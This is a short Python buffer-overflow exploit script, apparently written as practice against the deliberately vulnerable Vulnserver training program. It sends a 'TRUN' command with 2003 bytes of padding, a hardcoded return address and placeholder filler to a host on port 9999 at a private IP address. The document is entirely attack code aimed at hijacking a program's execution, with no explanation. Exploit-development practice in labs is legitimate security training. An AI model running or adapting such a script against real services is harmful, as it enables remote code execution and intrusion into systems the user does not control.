import socket, sys
payload=b"A"*2003
payload+=b"\xaf\x11\x50\x62"
payload+=b"C"*4
payload+=b"D"*4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.141", 9999))
s.send((b"TRUN /.:/"+payload))
s.close()
sys.exit()
